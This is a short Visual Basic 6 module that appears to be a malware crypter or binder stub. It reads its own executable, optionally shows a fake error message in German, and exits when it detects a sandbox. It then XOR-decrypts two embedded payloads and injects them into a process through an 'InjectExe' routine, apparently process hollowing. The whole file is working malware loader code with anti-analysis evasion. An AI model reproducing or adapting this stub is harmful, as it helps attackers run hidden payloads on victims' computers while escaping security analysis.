Attribute VB_Name = "Module1"
Sub Main()
On Error Resume Next
Dim a As String
Dim b() As String

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
a = Space(LOF(1))
Get #1, , a
Close #1

b() = Split(a, "^^^^")

If b(6) = "" Then
Else
MsgBox b(6), vbCritical, "Fehler."
End If


If b(4) = "TRUE" Then
Call z
End If

If b(5) = "TRUE" Then
If Sandboxed = True Then End
End If


Dim a1() As Byte
Dim b2() As Byte

a1() = XOR3(b(1), b(3))
b2() = XOR3(b(2), b(3))

InjectExe App.Path & "\" & App.EXEName & ".exe", StrConv(a1(), vbFromUnicode)
InjectExe App.Path & "\" & App.EXEName & ".exe", StrConv(b2(), vbFromUnicode)

End Sub
